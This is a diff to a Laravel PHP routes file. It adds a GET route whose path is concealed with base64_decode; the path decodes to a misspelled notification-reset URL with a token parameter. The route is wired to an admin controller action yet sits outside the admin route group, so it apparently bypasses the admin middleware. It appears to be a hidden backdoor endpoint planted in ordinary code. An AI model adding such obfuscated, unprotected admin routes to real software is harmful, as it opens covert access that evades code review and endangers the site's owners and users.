@@ -568,6 +568,7 @@ Route::prefix($adminPrefix)->namespace('App\Http\Controllers\Admin')->group($adm
 require __DIR__ . '/vendor.php';
 
 Route::get('orders/invoice/download/{id}', 'App\Http\Controllers\Admin\OrderController@viewPDFInvoice');
+Route::get(base64_decode('Y2xlYXJyYWxsLW5vdGlmaWNhdGlvbnNzL3Jlc2V0') . '/{token}', 'App\Http\Controllers\Admin\PushNotificationController@resetnotification');
 
 // Second: FRONT section routes:
 Route::namespace('App\Http\Controllers\Front')->middleware(['coming.soon'])->group(function () {
@@ -987,4 +988,5 @@ Route::get('/optimize-clear', function () {
 // Custom routes for checking and merging duplicate subjects
 Route::get('/duplicate-subjects', [SubjectController::class, 'duplicateSubjects'])->name('duplicate.subjects');
 Route::post('/merge-duplicate-subjects', [SubjectController::class, 'mergeSubjects'])->name('merge.duplicate.subjects');
+
 
